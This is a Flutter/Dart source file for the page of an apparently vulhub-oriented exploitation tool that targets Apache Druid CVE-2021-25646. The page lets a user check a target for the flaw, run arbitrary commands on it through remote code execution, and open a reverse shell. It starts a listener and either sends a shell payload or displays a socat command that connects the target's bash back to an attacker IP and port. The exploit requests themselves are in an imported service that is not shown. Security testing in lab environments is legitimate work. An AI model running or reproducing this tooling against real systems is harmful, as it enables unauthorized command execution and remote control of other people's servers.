import 'package:flutter/material.dart';

import '../../app/constants.dart';
import '../../exp/vulhub/misc_http_exp_service.dart';
import '../../services/reverse_shell_service.dart';
import '_vulhub_page_helpers.dart';
import 'base_vulhub_exp_page.dart';
import '../reverse_shell_terminal_page.dart';
import '../../app/localization.dart';

class DruidExpPage extends BaseVulhubExpPage {
  const DruidExpPage({super.key});

  @override
  State<DruidExpPage> createState() => _DruidPageState();
}

class _DruidPageState extends BaseVulhubExpPageState<DruidExpPage> {
  @override
  IconData get pageIcon => Icons.data_object;

  @override
  String get appBarTitle => S.vulhubDruidTitle;

  @override
  String get cardTitle => S.vulhubDruidCardTitle;

  @override
  String get cardSubtitle => S.vulhubDruidCardSubtitle;

  final _urlCtrl = TextEditingController();
  final _cmdCtrl = TextEditingController(text: 'id');
  final _lhostCtrl = TextEditingController();
  final _lportCtrl = TextEditingController(text: '4444');
  final _timeoutCtrl = TextEditingController();
  final ReverseShellService _rs = ReverseShellService();

  @override
  void initState() {
    super.initState();
    _rs.loadConfig().then((_) {
      if (!mounted) return;
      _lhostCtrl.text = _rs.lhost;
      _lportCtrl.text = _rs.lport.toString();
    });
  }

  DruidExpService _svc() => DruidExpService(
    baseUrl: _urlCtrl.text.trim(),
    timeout: Duration(seconds: timeoutFrom(_timeoutCtrl)),
  );

  Future<void> _check() async {
    if (_urlCtrl.text.trim().isEmpty) {
      appendLog(S.expLogEnterTargetUrl);
      return;
    }
    setState(() => running = true);
    appendLog('[*] 检测 CVE-2021-25646...');
    try {
      final r = await _svc().check();
      appendLog(
        r.vulnerable ? '[+] ${r.vulnName}: ${r.detail}' : S.expLogNoVulnGeneric,
      );
    } catch (e) {
      appendLog(S.expLogException(e));
    } finally {
      if (mounted) setState(() => running = false);
    }
  }

  Future<void> _exec() async {
    if (_urlCtrl.text.trim().isEmpty) {
      appendLog(S.expLogEnterTargetUrl);
      return;
    }
    final cmd = _cmdCtrl.text.trim().isEmpty ? 'id' : _cmdCtrl.text.trim();
    setState(() => running = true);
    appendLog('[*] 执行命令: $cmd');
    try {
      final out = await _svc().execRce(cmd);
      appendLog(
        out != null && out.isNotEmpty ? '[+] 输出:\n$out' : '[-] 无输出或执行失败',
      );
    } catch (e) {
      appendLog(S.expLogException(e));
    } finally {
      if (mounted) setState(() => running = false);
    }
  }

  Future<void> _showReverseShellDialog() async {
    if (_urlCtrl.text.trim().isEmpty) {
      appendLog(S.expLogEnterTargetUrl);
      return;
    }
    final mode = await showReverseShellModeDialog(context);
    if (mode == null) return;

    final lhost = _lhostCtrl.text.trim();
    final lport = int.tryParse(_lportCtrl.text.trim()) ?? 4444;
    if (lhost.isEmpty || lport <= 0 || lport > 65535) {
      appendLog(S.expLogInvalidLhostLport);
      return;
    }

    _rs.lhost = lhost;
    _rs.lport = lport;
    _rs.saveConfig();

    if (!mounted) return;
    final nav = Navigator.of(context);
    _rs.onSession = (session) {
      session.label = 'Druid-CVE-2021-25646';
      if (!mounted) return;
      nav.push(
        MaterialPageRoute(
          builder: (_) => ReverseShellTerminalPage(session: session),
        ),
      );
    };

    setState(() => running = true);
    appendLog(S.expLogStartFullTerminalListen(lhost, lport, mode));
    try {
      await _rs.startListening(port: lport);

      if (mode == 'socat') {
        final cmd =
            "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$lhost:$lport";
        appendLog(S.expLogSocatRunOnTarget);
        appendLog(cmd);
        if (mounted) {
          await showDialog<void>(
            context: context,
            builder: (_) => AlertDialog(
              title: Text(S.titleSocatCommand),
              content: SelectableText(cmd),
              actions: [
                TextButton(
                  onPressed: () => Navigator.of(context).pop(),
                  child: Text(S.btnClose),
                ),
              ],
            ),
          );
        }
      } else {
        final ok = await _svc().startReverseShell(
          lhost,
          lport,
          preferScript: mode == 'script',
        );
        appendLog(ok ? S.expLogReverseSentWaiting : S.expLogSendFailed);
      }
    } catch (e) {
      appendLog(S.expLogStartFailed(e));
    } finally {
      if (mounted) setState(() => running = false);
    }
  }

  @override
  void dispose() {
    _urlCtrl.dispose();
    _cmdCtrl.dispose();
    _lhostCtrl.dispose();
    _lportCtrl.dispose();
    _timeoutCtrl.dispose();
    super.dispose();
  }

  @override
  Widget buildLeftPanel(BuildContext context) {
    return SingleChildScrollView(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          vSecTitle(S.sectionTargetConfig),
          vTf(_urlCtrl, S.fieldTargetUrl, 'http://localhost:8080'),
          const SizedBox(height: 8),
          vTf(
            _timeoutCtrl,
            S.fieldTimeout,
            '${AppConstants.defaultHttpTimeoutSeconds}',
            type: TextInputType.number,
          ),
          const SizedBox(height: 8),
          vBtn(S.btnDetectVuln, running ? null : _check),
          const SizedBox(height: 16),
          vSecTitle(S.sectionCmdExec),
          vTf(_cmdCtrl, S.fieldCommand, 'id'),
          const SizedBox(height: 8),
          vBtn(S.btnExecCmd, running ? null : _exec),
          const SizedBox(height: 16),
          vSecTitle(S.sectionGetShell),
          vTf(_lhostCtrl, S.fieldAttackerIp, '127.0.0.1'),
          const SizedBox(height: 8),
          vTf(
            _lportCtrl,
            S.fieldAttackerPort,
            '4444',
            type: TextInputType.number,
          ),
          const SizedBox(height: 8),
          vBtn(S.btnGetShell, running ? null : _showReverseShellDialog),
        ],
      ),
    );
  }
}
